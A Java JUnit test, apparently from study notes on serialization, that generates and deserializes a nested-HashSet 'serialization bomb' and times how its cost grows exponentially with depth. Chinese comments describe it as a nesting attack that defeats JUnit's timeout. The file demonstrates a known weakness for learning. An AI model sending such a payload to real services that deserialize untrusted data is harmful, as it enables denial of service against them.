package chapter12;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.Timeout;

import java.io.*;
import java.util.HashSet;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.function.Function;

public final class serializable_test_1st {
    private static class serializableClass implements Serializable {
        private static final long serialVersionUID = 0x5453028181202L;
        public Set<Object> set;
    }

    @Test
    @Timeout(value = 30, unit = TimeUnit.SECONDS)
    public void testBomb() throws IOException, ClassNotFoundException {
        System.out.println(System.currentTimeMillis());
        for (int i = 18; i < 25; i++) {
            final var begin = System.currentTimeMillis();
            System.out.printf("%d begin at %d%n", i, begin);
            final var boomCharArray = bombObjectMaker.apply(i);
            try (InputStream is = new ByteArrayInputStream(boomCharArray);
                 ObjectInputStream input = new ObjectInputStream(is)) {
                final var d = (serializableClass) input.readObject();
                // 典中典之嵌套攻击,层数太深,并且每一层都有对象导致的递归地狱
                // 甚至数量大之后Junit的@Timeout注解都会无效
                // 耗时指数级上升
            }
            System.out.printf("%d cost %d ms %n", i, (System.currentTimeMillis() - begin));
        }
    }

    private final Function<Integer, byte[]> bombObjectMaker = (var length) -> {
        var root = new HashSet<>();
        var s1 = new HashSet<>();
        var s2 = new HashSet<>();
        root.add(s1);
        root.add(s2);
        for (int i = 0; i < length; i++) {
            var t1 = new HashSet<>();
            var t2 = new HashSet<>();
            t1.add(UUID.randomUUID().toString().substring(0, 4));
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (ObjectOutputStream output = new ObjectOutputStream(buffer)) {
            final var temp = new serializableClass();
            temp.set = root;
            output.writeObject(temp);
        } catch (IOException e) {
            e.printStackTrace();
        }
        final var byteArray = buffer.toByteArray();
        System.out.println(byteArray.length);
        return byteArray;
    };
}
